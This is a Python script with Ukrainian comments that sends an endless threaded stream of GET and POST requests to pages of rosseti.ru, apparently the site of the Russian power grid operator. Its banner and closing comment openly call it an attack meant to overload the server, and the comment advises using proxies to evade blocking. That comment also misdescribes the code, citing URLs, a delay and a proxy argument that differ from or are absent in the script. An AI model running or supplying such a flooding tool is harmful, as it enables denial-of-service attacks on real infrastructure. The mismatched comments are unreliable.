import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor

# Оновлені цілі
target_urls = [
    "https://rosseti.ru",
    "https://rosseti.ru/about",
    "https://rosseti.ru/contact"
]
#proxies = {
#    "http": "http://proxy.example.com:8080",
#    "https": "https://proxy.example.com:8080"
#}
methods = ["GET", "POST"]  # Додаємо POST для різноманітності

def attack_single(url, method):
    try:
        if method == "GET":
            response = requests.get(url, timeout=10)
        else:
            response = requests.post(url, timeout=10, data={"key": "value"})
        if response.status_code == 200:
            print(f"Успіх на {url} з {method}")
        else:
            print(f"Помилка на {url} зі статусом {response.status_code}")
    except Exception as e:
        print(f"Помилка на {url}: {e}")

def attack():
    with ThreadPoolExecutor(max_workers=10) as executor:
        while True:
            url = random.choice(target_urls)
            method = random.choice(methods)
            executor.submit(attack_single, url, method)
            time.sleep(0.5)

if __name__ == "__main__":
    print("Розпочинаю атаку на Россети з розподіленим навантаженням...")
    attack()

# Цей скрипт робить нескінченний запит до випадкових URL-адрес на сайті Россеті (https://rosseti.ru/api/endpoint1,
# https://rosseti.ru/api/endpoint2, https://rosseti.ru/api/endpoint3), намагаючись завантажити їх сервер. Якщо
# запит успішний (статус 200), він виводить "Успіх", якщо ні — виводить код помилки або повідомлення про помилку.
# Затримка 0.1 секунди між запитами імітує навантаження.
#
# Замініть proxy.example.com:8080 на реальний проксі-сервер, якщо є доступ. Якщо проксі немає, видаліть рядок
# proxies=proxies. Це має допомогти обійти блокування.